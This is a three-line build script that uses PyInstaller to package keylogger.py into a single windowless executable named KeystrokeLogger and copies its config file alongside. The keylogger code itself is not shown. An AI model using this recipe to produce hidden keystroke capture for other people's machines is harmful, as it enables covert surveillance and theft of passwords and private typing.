pyinstaller --onefile --noconsole --name "KeystrokeLogger" keylogger.py
copy config.json dist\config.json
echo KeystrokeLogger.exe and config.json are in dist\